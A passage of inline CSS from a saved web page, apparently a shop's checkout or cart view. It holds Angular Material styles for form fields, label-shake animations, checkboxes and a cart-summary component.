      .mat-mdc-text-field-wrapper .mat-mdc-form-field-infix .mat-mdc-floating-label {
        left: auto;
        right: auto
      }

      .mat-mdc-text-field-wrapper.mdc-text-field--outlined .mdc-text-field__input {
        display: inline-block
      }

      .mat-mdc-form-field .mat-mdc-text-field-wrapper.mdc-text-field .mdc-notched-outline__notch {
        padding-top: 0
      }

      .mat-mdc-text-field-wrapper::before {
        content: none
      }

      .mat-mdc-form-field-subscript-wrapper {
        box-sizing: border-box;
        width: 100%;
        position: relative
      }

      .mat-mdc-form-field-hint-wrapper,
      .mat-mdc-form-field-error-wrapper {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        padding: 0 16px
      }

      .mat-mdc-form-field-subscript-dynamic-size .mat-mdc-form-field-hint-wrapper,
      .mat-mdc-form-field-subscript-dynamic-size .mat-mdc-form-field-error-wrapper {
        position: static
      }

      .mat-mdc-form-field-bottom-align::before {
        content: "";
        display: inline-block;
        height: 16px
      }

      .mat-mdc-form-field-bottom-align.mat-mdc-form-field-subscript-dynamic-size::before {
        content: unset
      }

      .mat-mdc-form-field-hint-end {
        order: 1
      }

      .mat-mdc-form-field-hint-wrapper {
        display: flex
      }

      .mat-mdc-form-field-hint-spacer {
        flex: 1 0 1em
      }

      .mat-mdc-form-field-error {
        display: block
      }

      .mat-mdc-form-field-focus-overlay {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        opacity: 0
      }

      select.mat-mdc-form-field-input-control {
        -moz-appearance: none;
        -webkit-appearance: none;
        background-color: rgba(0, 0, 0, 0);
        display: inline-flex;
        box-sizing: border-box
      }

      select.mat-mdc-form-field-input-control:not(:disabled) {
        cursor: pointer
      }

      .mat-mdc-form-field-type-mat-native-select .mat-mdc-form-field-infix::after {
        content: "";
        width: 0;
        height: 0;
        border-left: 5px solid rgba(0, 0, 0, 0);
        border-right: 5px solid rgba(0, 0, 0, 0);
        border-top: 5px solid;
        position: absolute;
        right: 0;
        pointer-events: none
      }

      [dir=rtl] .mat-mdc-form-field-type-mat-native-select .mat-mdc-form-field-infix::after {
        right: auto;
        left: 0
      }

      .mat-mdc-form-field-type-mat-native-select .mat-mdc-form-field-input-control {
        padding-right: 15px
      }

      [dir=rtl] .mat-mdc-form-field-type-mat-native-select .mat-mdc-form-field-input-control {
        padding-right: 0;
        padding-left: 15px
      }

      .cdk-high-contrast-active .mat-form-field-appearance-fill .mat-mdc-text-field-wrapper {
        outline: solid 1px
      }

      .cdk-high-contrast-active .mat-form-field-appearance-fill.mat-form-field-disabled .mat-mdc-text-field-wrapper {
        outline-color: GrayText
      }

      .cdk-high-contrast-active .mat-form-field-appearance-fill.mat-focused .mat-mdc-text-field-wrapper {
        outline: dashed 3px
      }

      .cdk-high-contrast-active .mat-mdc-form-field.mat-focused .mdc-notched-outline {
        border: dashed 3px
      }

      .mat-mdc-form-field {
        --mat-mdc-form-field-floating-label-scale: 0.75;
        display: inline-flex;
        flex-direction: column;
        min-width: 0;
        text-align: left
      }

      [dir=rtl] .mat-mdc-form-field {
        text-align: right
      }

      .mat-mdc-form-field-flex {
        display: inline-flex;
        align-items: baseline;
        box-sizing: border-box;
        width: 100%
      }

      .mat-mdc-text-field-wrapper {
        width: 100%
      }

      .mat-mdc-form-field-icon-prefix,
      .mat-mdc-form-field-icon-suffix {
        align-self: center;
        line-height: 0
      }

      .mat-mdc-form-field-icon-prefix,
      [dir=rtl] .mat-mdc-form-field-icon-suffix {
        padding: 0 4px 0 0
      }

      .mat-mdc-form-field-icon-suffix,
      [dir=rtl] .mat-mdc-form-field-icon-prefix {
        padding: 0 0 0 4px
      }

      .mat-mdc-form-field-icon-prefix>.mat-icon,
      .mat-mdc-form-field-icon-suffix>.mat-icon {
        padding: 12px;
        box-sizing: content-box
      }

      .mat-mdc-form-field-subscript-wrapper .mat-icon,
      .mat-mdc-form-field label .mat-icon {
        width: 1em;
        height: 1em;
        font-size: inherit
      }

      .mat-mdc-form-field-infix {
        flex: auto;
        min-width: 0;
        width: 180px;
        position: relative;
        box-sizing: border-box
      }

      .mat-mdc-form-field .mdc-notched-outline__notch {
        margin-left: -1px;
        -webkit-clip-path: inset(-9em -999em -9em 1px);
        clip-path: inset(-9em -999em -9em 1px)
      }

      [dir=rtl] .mat-mdc-form-field .mdc-notched-outline__notch {
        margin-left: 0;
        margin-right: -1px;
        -webkit-clip-path: inset(-9em 1px -9em -999em);
        clip-path: inset(-9em 1px -9em -999em)
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input {
        transition: opacity 150ms 0ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      @media all {
        .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input::placeholder {
          transition: opacity 67ms 0ms cubic-bezier(0.4, 0, 0.2, 1)
        }
      }

      @media all {
        .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input:-ms-input-placeholder {
          transition: opacity 67ms 0ms cubic-bezier(0.4, 0, 0.2, 1)
        }
      }

      @media all {

        .mdc-text-field--no-label .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input::placeholder,
        .mdc-text-field--focused .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input::placeholder {
          transition-delay: 40ms;
          transition-duration: 110ms
        }
      }

      @media all {

        .mdc-text-field--no-label .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input:-ms-input-placeholder,
        .mdc-text-field--focused .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__input:-ms-input-placeholder {
          transition-delay: 40ms;
          transition-duration: 110ms
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field__affix {
        transition: opacity 150ms 0ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--filled.mdc-ripple-upgraded--background-focused .mdc-text-field__ripple::before,
      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--filled:not(.mdc-ripple-upgraded):focus .mdc-text-field__ripple::before {
        transition-duration: 75ms
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--outlined .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-text-field-outlined 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-text-field-outlined {
        0% {
          transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - 0%)) translateY(-34.75px) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - 0%)) translateY(-34.75px) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - 0%)) translateY(-34.75px) scale(0.75)
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--textarea {
        transition: none
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--textarea.mdc-text-field--filled .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-textarea-filled 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-textarea-filled {
        0% {
          transform: translateX(calc(0 - 0%)) translateY(-10.25px) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - 0%)) translateY(-10.25px) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - 0%)) translateY(-10.25px) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - 0%)) translateY(-10.25px) scale(0.75)
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--textarea.mdc-text-field--outlined .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-textarea-outlined 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-textarea-outlined {
        0% {
          transform: translateX(calc(0 - 0%)) translateY(-24.75px) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - 0%)) translateY(-24.75px) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - 0%)) translateY(-24.75px) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - 0%)) translateY(-24.75px) scale(0.75)
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon {
        0% {
          transform: translateX(calc(0 - 32px)) translateY(-34.75px) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - 32px)) translateY(-34.75px) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - 32px)) translateY(-34.75px) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - 32px)) translateY(-34.75px) scale(0.75)
        }
      }

      [dir=rtl] .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--with-leading-icon.mdc-text-field--outlined .mdc-floating-label--shake,
      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-text-field--with-leading-icon.mdc-text-field--outlined[dir=rtl] .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl {
        0% {
          transform: translateX(calc(0 - -32px)) translateY(-34.75px) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - -32px)) translateY(-34.75px) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - -32px)) translateY(-34.75px) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - -32px)) translateY(-34.75px) scale(0.75)
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-floating-label {
        transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), color 150ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-floating-label--shake {
        animation: mdc-floating-label-shake-float-above-standard 250ms 1
      }

      @keyframes mdc-floating-label-shake-float-above-standard {
        0% {
          transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
        }

        33% {
          animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
          transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
        }

        66% {
          animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
          transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
        }

        100% {
          transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
        }
      }

      .mat-mdc-form-field:not(.mat-form-field-no-animations) .mdc-line-ripple::after {
        transition: transform 180ms cubic-bezier(0.4, 0, 0.2, 1), opacity 180ms cubic-bezier(0.4, 0, 0.2, 1)
      }
    </style>
    <style>
      .cart-summary__row[_ngcontent-isc-c473] {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding-bottom: .625rem
      }

      .cart-summary__row.discount[_ngcontent-isc-c473] {
        color: var(--systemColorSuccess600)
      }

      .cart-summary__row.agreement[_ngcontent-isc-c473] {
        justify-content: flex-start;
        margin-left: -10px
      }

      .cart-summary__row.total[_ngcontent-isc-c473] {
        padding-bottom: 0
      }

      .form__container[_ngcontent-isc-c473] {
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12);
        padding-bottom: .5rem
      }

      .form__container__in[_ngcontent-isc-c473] {
        padding: 1rem 1.5rem
      }

      .form__container[_ngcontent-isc-c473] button[_ngcontent-isc-c473] {
        width: 100%;
        padding: 1.5rem 0
      }

      .form__container[_ngcontent-isc-c473] mat-divider[_ngcontent-isc-c473] {
        margin: 0
      }
    </style>
    <style>
      .mdc-touch-target-wrapper {
        display: inline
      }

      @keyframes mdc-checkbox-unchecked-checked-checkmark-path {

        0%,
        50% {
          stroke-dashoffset: 29.7833385
        }

        50% {
          animation-timing-function: cubic-bezier(0, 0, 0.2, 1)
        }

        100% {
          stroke-dashoffset: 0
        }
      }

      @keyframes mdc-checkbox-unchecked-indeterminate-mixedmark {

        0%,
        68.2% {
          transform: scaleX(0)
        }

        68.2% {
          animation-timing-function: cubic-bezier(0, 0, 0, 1)
        }

        100% {
          transform: scaleX(1)
        }
      }

      @keyframes mdc-checkbox-checked-unchecked-checkmark-path {
        from {
          animation-timing-function: cubic-bezier(0.4, 0, 1, 1);
          opacity: 1;
          stroke-dashoffset: 0
        }

        to {
          opacity: 0;
          stroke-dashoffset: -29.7833385
        }
      }

      @keyframes mdc-checkbox-checked-indeterminate-checkmark {
        from {
          animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
          transform: rotate(0deg);
          opacity: 1
        }

        to {
          transform: rotate(45deg);
          opacity: 0
        }
      }

      @keyframes mdc-checkbox-indeterminate-checked-checkmark {
        from {
          animation-timing-function: cubic-bezier(0.14, 0, 0, 1);
          transform: rotate(45deg);
          opacity: 0
        }

        to {
          transform: rotate(360deg);
          opacity: 1
        }
      }

      @keyframes mdc-checkbox-checked-indeterminate-mixedmark {
        from {
          animation-timing-function: mdc-animation-deceleration-curve-timing-function;
          transform: rotate(-45deg);
          opacity: 0
        }

        to {
          transform: rotate(0deg);
          opacity: 1
        }
      }

      @keyframes mdc-checkbox-indeterminate-checked-mixedmark {
        from {
          animation-timing-function: cubic-bezier(0.14, 0, 0, 1);
          transform: rotate(0deg);
          opacity: 1
        }

        to {
          transform: rotate(315deg);
          opacity: 0
        }
      }

      @keyframes mdc-checkbox-indeterminate-unchecked-mixedmark {
        0% {
          animation-timing-function: linear;
          transform: scaleX(1);
          opacity: 1
        }

        32.8%,
        100% {
          transform: scaleX(0);
          opacity: 0
        }
      }

      .mdc-checkbox {
        display: inline-block;
        position: relative;
        flex: 0 0 18px;
        box-sizing: content-box;
        width: 18px;
        height: 18px;
        line-height: 0;
        white-space: nowrap;
        cursor: pointer;
        vertical-align: bottom
      }

      .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__focus-ring,
      .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__focus-ring {
        pointer-events: none;
        border: 2px solid rgba(0, 0, 0, 0);
        border-radius: 6px;
        box-sizing: content-box;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        height: 100%;
        width: 100%
      }

      @media screen and (forced-colors: active) {

        .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__focus-ring,
        .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__focus-ring {
          border-color: CanvasText
        }
      }

      .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__focus-ring::after,
      .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__focus-ring::after {
        content: "";
        border: 2px solid rgba(0, 0, 0, 0);
        border-radius: 8px;
        display: block;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        height: calc(100% + 4px);
        width: calc(100% + 4px)
      }

      @media screen and (forced-colors: active) {

        .mdc-checkbox.mdc-ripple-upgraded--background-focused .mdc-checkbox__focus-ring::after,
        .mdc-checkbox:not(.mdc-ripple-upgraded):focus .mdc-checkbox__focus-ring::after {
          border-color: CanvasText
        }
      }

      @media all and (-ms-high-contrast: none) {
        .mdc-checkbox .mdc-checkbox__focus-ring {
          display: none
        }
      }

      @media screen and (forced-colors: active),
      (-ms-high-contrast: active) {
        .mdc-checkbox__mixedmark {
          margin: 0 1px
        }
      }

      .mdc-checkbox--disabled {
        cursor: default;
        pointer-events: none
      }

      .mdc-checkbox__background {
        display: inline-flex;
        position: absolute;
        align-items: center;
        justify-content: center;
        box-sizing: border-box;
        width: 18px;
        height: 18px;
        border: 2px solid currentColor;
        border-radius: 2px;
        background-color: rgba(0, 0, 0, 0);
        pointer-events: none;
        will-change: background-color, border-color;
        transition: background-color 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1), border-color 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-checkbox__checkmark {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100%;
        opacity: 0;
        transition: opacity 180ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-checkbox--upgraded .mdc-checkbox__checkmark {
        opacity: 1
      }

      .mdc-checkbox__checkmark-path {
        transition: stroke-dashoffset 180ms 0ms cubic-bezier(0.4, 0, 0.6, 1);
        stroke: currentColor;
        stroke-width: 3.12px;
        stroke-dashoffset: 29.7833385;
        stroke-dasharray: 29.7833385
      }

      .mdc-checkbox__mixedmark {
        width: 100%;
        height: 0;
        transform: scaleX(0) rotate(0deg);
        border-width: 1px;
        border-style: solid;
        opacity: 0;
        transition: opacity 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1), transform 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-checkbox--anim-unchecked-checked .mdc-checkbox__background,
      .mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__background,
      .mdc-checkbox--anim-checked-unchecked .mdc-checkbox__background,
      .mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__background {
        animation-duration: 180ms;
        animation-timing-function: linear
      }

      .mdc-checkbox--anim-unchecked-checked .mdc-checkbox__checkmark-path {
        animation: mdc-checkbox-unchecked-checked-checkmark-path 180ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__mixedmark {
        animation: mdc-checkbox-unchecked-indeterminate-mixedmark 90ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-checked-unchecked .mdc-checkbox__checkmark-path {
        animation: mdc-checkbox-checked-unchecked-checkmark-path 90ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-checked-indeterminate .mdc-checkbox__checkmark {
        animation: mdc-checkbox-checked-indeterminate-checkmark 90ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-checked-indeterminate .mdc-checkbox__mixedmark {
        animation: mdc-checkbox-checked-indeterminate-mixedmark 90ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-indeterminate-checked .mdc-checkbox__checkmark {
        animation: mdc-checkbox-indeterminate-checked-checkmark 500ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-indeterminate-checked .mdc-checkbox__mixedmark {
        animation: mdc-checkbox-indeterminate-checked-mixedmark 500ms linear 0s;
        transition: none
      }

      .mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__mixedmark {
        animation: mdc-checkbox-indeterminate-unchecked-mixedmark 300ms linear 0s;
        transition: none
      }

      .mdc-checkbox__native-control:checked~.mdc-checkbox__background,
      .mdc-checkbox__native-control:indeterminate~.mdc-checkbox__background,
      .mdc-checkbox__native-control[data-indeterminate=true]~.mdc-checkbox__background {
        transition: border-color 90ms 0ms cubic-bezier(0, 0, 0.2, 1), background-color 90ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-checkbox__native-control:checked~.mdc-checkbox__background .mdc-checkbox__checkmark-path,
      .mdc-checkbox__native-control:indeterminate~.mdc-checkbox__background .mdc-checkbox__checkmark-path,
      .mdc-checkbox__native-control[data-indeterminate=true]~.mdc-checkbox__background .mdc-checkbox__checkmark-path {
        stroke-dashoffset: 0
      }

      .mdc-checkbox__native-control {
        position: absolute;
        margin: 0;
        padding: 0;
        opacity: 0;
        cursor: inherit
      }

      .mdc-checkbox__native-control:disabled {
        cursor: default;
        pointer-events: none
      }

      .mdc-checkbox--touch {
        margin: calc((var(--mdc-checkbox-state-layer-size, 48px) - var(--mdc-checkbox-state-layer-size, 40px)) / 2)
      }

      .mdc-checkbox--touch .mdc-checkbox__native-control {
        top: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px)) / 2);
        right: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px)) / 2);
        left: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 48px)) / 2);
        width: var(--mdc-checkbox-state-layer-size, 48px);
        height: var(--mdc-checkbox-state-layer-size, 48px)
      }

      .mdc-checkbox__native-control:checked~.mdc-checkbox__background .mdc-checkbox__checkmark {
        transition: opacity 180ms 0ms cubic-bezier(0, 0, 0.2, 1), transform 180ms 0ms cubic-bezier(0, 0, 0.2, 1);
        opacity: 1
      }

      .mdc-checkbox__native-control:checked~.mdc-checkbox__background .mdc-checkbox__mixedmark {
        transform: scaleX(1) rotate(-45deg)
      }

      .mdc-checkbox__native-control:indeterminate~.mdc-checkbox__background .mdc-checkbox__checkmark,
      .mdc-checkbox__native-control[data-indeterminate=true]~.mdc-checkbox__background .mdc-checkbox__checkmark {
        transform: rotate(45deg);
        opacity: 0;
        transition: opacity 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1), transform 90ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-checkbox__native-control:indeterminate~.mdc-checkbox__background .mdc-checkbox__mixedmark,
      .mdc-checkbox__native-control[data-indeterminate=true]~.mdc-checkbox__background .mdc-checkbox__mixedmark {
        transform: scaleX(1) rotate(0deg);
        opacity: 1
      }

      .mdc-checkbox.mdc-checkbox--upgraded .mdc-checkbox__background,
      .mdc-checkbox.mdc-checkbox--upgraded .mdc-checkbox__checkmark,
      .mdc-checkbox.mdc-checkbox--upgraded .mdc-checkbox__checkmark-path,
      .mdc-checkbox.mdc-checkbox--upgraded .mdc-checkbox__mixedmark {
        transition: none
      }

      .mdc-form-field {
        display: inline-flex;
        align-items: center;
        vertical-align: middle
      }

      .mdc-form-field>label {
        margin-left: 0;
        margin-right: auto;
        padding-left: 4px;
        padding-right: 0;
        order: 0
      }

      [dir=rtl] .mdc-form-field>label,
      .mdc-form-field>label[dir=rtl] {
        margin-left: auto;
        margin-right: 0
      }

      [dir=rtl] .mdc-form-field>label,
      .mdc-form-field>label[dir=rtl] {
        padding-left: 0;
        padding-right: 4px
      }

      .mdc-form-field--nowrap>label {
        text-overflow: ellipsis;
        overflow: hidden;
        white-space: nowrap
      }

      .mdc-form-field--align-end>label {
        margin-left: auto;
        margin-right: 0;
        padding-left: 0;
        padding-right: 4px;
        order: -1
      }

      [dir=rtl] .mdc-form-field--align-end>label,
      .mdc-form-field--align-end>label[dir=rtl] {
        margin-left: 0;
        margin-right: auto
      }

      [dir=rtl] .mdc-form-field--align-end>label,
      .mdc-form-field--align-end>label[dir=rtl] {
        padding-left: 4px;
        padding-right: 0
      }

      .mdc-form-field--space-between {
        justify-content: space-between
      }

      .mdc-form-field--space-between>label {
        margin: 0
      }

      [dir=rtl] .mdc-form-field--space-between>label,
      .mdc-form-field--space-between>label[dir=rtl] {
        margin: 0
      }

      .mat-mdc-checkbox {
        display: inline-block;
        position: relative
      }

      .mat-mdc-checkbox .mdc-checkbox {
        padding: calc((var(--mdc-checkbox-state-layer-size, 40px) - 18px) / 2);
        margin: calc((var(--mdc-checkbox-state-layer-size, 40px) - var(--mdc-checkbox-state-layer-size, 40px)) / 2)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control[disabled]:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-disabled-unselected-icon-color, rgba(0, 0, 0, 0.38));
        background-color: transparent
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control[disabled]:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control[disabled]:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control[data-indeterminate=true][disabled]~.mdc-checkbox__background {
        border-color: transparent;
        background-color: var(--mdc-checkbox-disabled-selected-icon-color, rgba(0, 0, 0, 0.38))
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:enabled~.mdc-checkbox__background .mdc-checkbox__checkmark {
        color: var(--mdc-checkbox-selected-checkmark-color, #fff)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:enabled~.mdc-checkbox__background .mdc-checkbox__mixedmark {
        border-color: var(--mdc-checkbox-selected-checkmark-color, #fff)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:disabled~.mdc-checkbox__background .mdc-checkbox__checkmark {
        color: var(--mdc-checkbox-disabled-selected-checkmark-color, #fff)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:disabled~.mdc-checkbox__background .mdc-checkbox__mixedmark {
        border-color: var(--mdc-checkbox-disabled-selected-checkmark-color, #fff)
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-unselected-icon-color, rgba(0, 0, 0, 0.54));
        background-color: transparent
      }

      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:enabled:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control:enabled:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox .mdc-checkbox__native-control[data-indeterminate=true]:enabled~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786))
      }

      @keyframes mdc-checkbox-fade-in-background-8A000000FF01878600000000FF018786 {
        0% {
          border-color: var(--mdc-checkbox-unselected-icon-color, rgba(0, 0, 0, 0.54));
          background-color: transparent
        }

        50% {
          border-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786))
        }
      }

      @keyframes mdc-checkbox-fade-out-background-8A000000FF01878600000000FF018786 {

        0%,
        80% {
          border-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-icon-color, var(--mdc-theme-secondary, #018786))
        }

        100% {
          border-color: var(--mdc-checkbox-unselected-icon-color, rgba(0, 0, 0, 0.54));
          background-color: transparent
        }
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-checkbox--anim-unchecked-checked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-in-background-8A000000FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox.mdc-checkbox--anim-checked-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox.mdc-checkbox--anim-indeterminate-unchecked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-out-background-8A000000FF01878600000000FF018786
      }

      .mat-mdc-checkbox .mdc-checkbox:hover .mdc-checkbox__native-control:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-unselected-hover-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: transparent
      }

      .mat-mdc-checkbox .mdc-checkbox:hover .mdc-checkbox__native-control:enabled:checked~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:hover .mdc-checkbox__native-control:enabled:indeterminate~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:hover .mdc-checkbox__native-control[data-indeterminate=true]:enabled~.mdc-checkbox__background {
        border-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786));
        background-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786))
      }

      @keyframes mdc-checkbox-fade-in-background-FF018786FF01878600000000FF018786 {
        0% {
          border-color: var(--mdc-checkbox-unselected-hover-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: transparent
        }

        50% {
          border-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786))
        }
      }

      @keyframes mdc-checkbox-fade-out-background-FF018786FF01878600000000FF018786 {

        0%,
        80% {
          border-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: var(--mdc-checkbox-selected-hover-icon-color, var(--mdc-theme-secondary, #018786))
        }

        100% {
          border-color: var(--mdc-checkbox-unselected-hover-icon-color, var(--mdc-theme-secondary, #018786));
          background-color: transparent
        }
      }

      .mat-mdc-checkbox .mdc-checkbox:hover.mdc-checkbox--anim-unchecked-checked .mdc-checkbox__native-control:enabled~.mdc-checkbox__background,
      .mat-mdc-checkbox .mdc-checkbox:hover.mdc-checkbox--anim-unchecked-indeterminate .mdc-checkbox__native-control:enabled~.mdc-checkbox__background {
        animation-name: mdc-checkbox-fade-in-background-FF018786FF01878600000000FF018786
      }

